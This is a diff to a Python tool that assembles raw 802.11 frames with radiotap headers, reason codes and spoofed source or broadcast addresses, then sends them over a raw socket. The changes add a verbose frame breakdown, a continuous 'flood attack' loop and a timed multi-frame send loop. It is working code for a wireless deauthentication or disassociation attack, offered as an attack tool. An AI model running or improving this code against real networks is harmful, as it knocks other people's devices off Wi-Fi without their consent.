@@ -21,12 +21,10 @@ import socket  # Low-level networking with raw sockets
 import okeusarguments # Parsing command-line arguments from arguments.py
 import convert # MAC address conversion from convert.py
 import reason # Handles reason codes
-import timer # Handles time-based attack types
-import framecontrol # Handles fragmentation and sequencing
 import rt # Adds radio tap header 
-import os
+import os # Used for ensuring permissions are set
 import struct  # Unpacking binary data (e.g., network headers)
-import sys
+import sys 
 import time
 
 def f_assem(args):
@@ -75,8 +73,10 @@ def f_assem(args):
 
     # second byte makeup of FCF
     if not frag_size:
+        ch = "NO"
         f_frag = struct.pack('B', 0x00)
     elif frag_size:
+        ch = "YES"
         f_frag = struct.pack('B', 0x10)
 
     # Duration field
@@ -116,12 +116,13 @@ def f_assem(args):
 
     # Body
     if not reason_code:
+        rc = None
         df = fh
     elif reason_code:
         rc = reason.reasoncode_input(reason_code)
         df = fh + rc
 
-    return df
+    return df, f_ctl, f_frag, f_dur, ct, src, net, seq, rc, ch
 
 def main():
     args = okeusarguments.parse_arguments()
@@ -132,47 +133,94 @@ def main():
     dur_of_attack = args.duration # mapped
     interface = args.netinterface
     verbose = args.verbose
+    dest_mac = args.dest # mapped
+    source_mac = args.ap_source # mapped
+    network_bssid = args.net_bssid # mapped
+    broadcast_attack =  args.broadcast # mapped
+    frag_size = args.fragment_size # mapped
+    seq_num = args.sequence # mapped
+    reason_code = args.reason_code # mapped
 
-    df = f_assem(args)
-    radio = rt.rt_head()
+    df, f_ctl, f_frag, f_dur, ct, src, net, seq, rc, ch = f_assem(args)
+    radio, ver, pad, rt_len, fp = rt.rt_head()
     frame = radio + df
+
+    def ver():
+        print(f"{'Frame composition'.center(100)}")
+        print("-" * 100)
+        print(f"Radiotap version: 0")
+        print(f"Radiotap pad: UNUSED")
+        print(f"Radiotap length: {rt_len.hex()}")
+        print(f"Radiotap fields present: {fp.hex()}")
+        print(f"Frame type: {f_ctl.hex()}")
+        print(f"Fragmentation set: {ch}")
+        print("Duration bytes not set: 0x00, 0x00")
+        if broadcast_attack:
+            print("Destination: FF:FF:FF:FF:FF:FF")
+        elif dest_mac:
+            print(f"Destination: {dest_mac}")
+        if not source_mac:
+            print(f"Source: {network_bssid}")
+        elif source_mac:
+            print(f"Source: {source_mac}")
+        print(f"Network: {network_bssid}")
+        print(f"Fragmentation size: {frag_size}")
+        print(f"Sequence Control Number: {seq_num}")
+        if not reason_code:
+            print("Reason Code: NONE **** MALFORMED PACKET ERROR ****")
+        if reason_code:
+            print(f"Reason Code: {reason.def_code(reason_code)}")
+        print(f"Frame: {frame.hex().upper()}")
+        print("-" * 100)
+
 
     # Open the socket
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
     s.bind((interface, 0))
 
-    # if timedelay:
-    #     timer.time_delay(timedelay)
     if frame_flood:
+        if verbose:
+            ver()
         try:
-            print(f"Flooding: {frame}")
+            print(f"Flooding: {ct.hex()}\nInterrupt with CTRL + C")
             while True:
                 s.send(frame)
                 time.sleep(.15)
-                if verbose:
-                    pass
         except KeyboardInterrupt:
-            print("Ending frame flood")
+            print("Ending flood attack")
         except Exception as e:
             print(f"Error: {e}")
         finally:
             s.close()
-    # if num_frames:
-    #     timer.user_frames(num_frames)
-    # if dur_of_attack:
-    #     timer.duration_input(dur_of_attack)
 
-    # try:
-    #     frame = rt.rthead() + df
-    #     s.send(frame)
-        
-    # except Exception as e:
-    #     print(f"Error: {e}")
-    #     exit(1)
-    # finally:
-    #     s.close()
+    if not frame_flood:
+        if timedelay:
+            t = timedelay // 1000
+            ti = timedelay
+        if not timedelay:
+            t = .5
+            ti = "500"
+        if num_frames:
+            n = num_frames
+        if not num_frames:
+            n = 3
+        try:
+            if verbose:
+                ver()
+            print(f"Sending {n} frames at a rate of {ti} ms.")
+            for i in range(n):
+                s.send(frame)
+                print(f"Sending frame: {i + 1}/{n}\n{frame}")
+                print(f"Waiting {ti} ms")
+                time.sleep(t)
+        except KeyboardInterrupt:
+            exit(1)
+        except Exception as e:
+            print(f"Error: {e}")
+        finally:
+            s.close()
 
-    print(frame)
+    #print(frame)
 
 if __name__ == "__main__":
     main()
